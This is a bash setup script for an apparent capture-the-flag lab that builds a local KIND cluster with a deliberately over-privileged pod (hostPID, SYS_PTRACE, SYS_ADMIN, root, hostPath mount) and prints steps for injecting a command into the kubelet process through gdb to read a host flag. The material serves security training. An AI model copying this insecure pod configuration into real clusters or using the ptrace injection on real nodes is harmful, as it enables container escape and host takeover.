#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-19-ptrace"

FLAG="${CVE_FLAG:-flag{k8s-19-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-19"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-19] CAP_SYS_PTRACE Host Process Injection"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

echo "[*] Deploying pod with SYS_PTRACE capability and hostPID..."
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: ptrace-pod
spec:
  hostPID: true
  containers:
    - name: attacker
      image: ubuntu:22.04
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          add:
            - SYS_PTRACE
            - SYS_ADMIN
        runAsUser: 0
      volumeMounts:
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

echo "[*] Waiting for pod to be ready..."
kubectl wait --for=condition=Ready pod/ptrace-pod --timeout=120s 2>/dev/null || true
sleep 5

echo "[*] Installing gdb in the pod..."
kubectl exec ptrace-pod -- bash -c "apt-get update -qq && apt-get install -y -qq gdb 2>/dev/null" 2>/dev/null || \
  echo "  gdb install in progress (may take a moment)..."

echo ""
echo "[+] K8S-19 CAP_SYS_PTRACE Host Injection Ready"
echo "    Flag directory: $FLAG_DIR"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. kubectl exec -it ptrace-pod -- bash"
echo "    2. apt-get update && apt-get install -y gdb  (if not already installed)"
echo "    3. ps aux | grep kubelet  (find kubelet PID)"
echo "    4. gdb -p <KUBELET_PID>"
echo "    5. In gdb: call (int)system(\"cat /host-flag/flag.txt > /tmp/flag.txt\")"
echo "    6. cat /tmp/flag.txt"
